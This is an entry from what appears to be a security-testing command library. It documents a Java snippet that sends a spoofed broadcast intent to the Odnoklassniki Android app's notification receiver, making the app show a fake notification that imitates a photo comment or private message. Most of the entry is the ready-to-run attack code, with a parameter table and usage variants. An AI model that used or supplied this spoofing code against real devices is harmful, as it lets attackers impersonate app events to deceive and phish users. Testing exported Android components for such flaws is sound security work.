---
data: >-
  Intent u = new Intent(); u.setAction("ru.ok.android.action.NOTIFY");
  u.putExtra("key", "d-147298617"); u.putExtra("message", "Hello there! This is
  a fake message. You have been tricked."); u.putExtra("dsc_id",
  "612470493988:USER_PHOTO"); getActivity().sendBroadcast(u);
tags:
  - intent
  - broadcast
  - spoofing
type: command
output: null
executor: java
platforms:
  - Android
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:42.350Z'
id: f6e31eb4-d40c-43ad-a6f7-3904993e821e
verified: false
validated: true
submitted: true
---
# send-fake-notification-intent

## Command

```java
Intent u = new Intent(); u.setAction("ru.ok.android.action.NOTIFY"); u.putExtra("key", "d-147298617"); u.putExtra("message", "Hello there! This is a fake message. You have been tricked."); u.putExtra("dsc_id", "612470493988:USER_PHOTO"); getActivity().sendBroadcast(u);
```

## Description

Broadcasts a spoofed notification intent to the Odnoklassniki NotifyReceiver, impersonating a photo comment event.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| setAction | "ru.ok.android.action.NOTIFY" to target receiver | Yes |
| putExtra key | Notification key, e.g., "d-147298617" | Yes |
| putExtra message | Fake message text | Yes |
| putExtra dsc_id | Description ID, e.g., "612470493988:USER_PHOTO" | Yes |
| sendBroadcast | Sends the intent | Yes |

## Examples

### Basic Usage

```java
Intent u = new Intent(); u.setAction("ru.ok.android.action.NOTIFY"); u.putExtra("key", "d-147298617"); u.putExtra("message", "Hello there! This is a fake message. You have been tricked."); u.putExtra("dsc_id", "612470493988:USER_PHOTO"); getActivity().sendBroadcast(u);
```

### Advanced Usage

Vary extras for different events:
```java
u.putExtra("key", "message"); u.putExtra("message", "Fake private message.");
```

## Expected Output

Fake notification displays, mimicking a real app event.

## Related

- [[Related Procedure]]
